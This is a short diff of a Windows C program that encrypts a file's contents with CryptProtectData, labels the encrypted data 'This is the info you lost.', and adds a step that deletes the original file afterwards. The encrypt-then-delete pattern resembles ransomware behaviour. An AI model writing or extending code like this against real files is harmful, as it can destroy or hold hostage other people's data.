@@ -159,7 +159,7 @@ int wmain(int argc, WCHAR * argv[])
 		// Encrypting data from source file
 		if (CryptProtectData(
 			&DataIn,
-			L"This is the info you lost. =/",
+			L"This is the info you lost.",
 			NULL,
 			NULL,
 			NULL,
@@ -225,6 +225,15 @@ int wmain(int argc, WCHAR * argv[])
 
 		CloseHandle(hSourceFile);
 		CloseHandle(hDestinationFile);
+
+		//----------------------------------------------------
+		// Deleting source file 
+		if (!DeleteFileW(fileName))
+		{
+			ShowError(GetLastError());
+		}
+
+		wprintf(L"\nSource file has been deleted. \n");
 
 	}
 
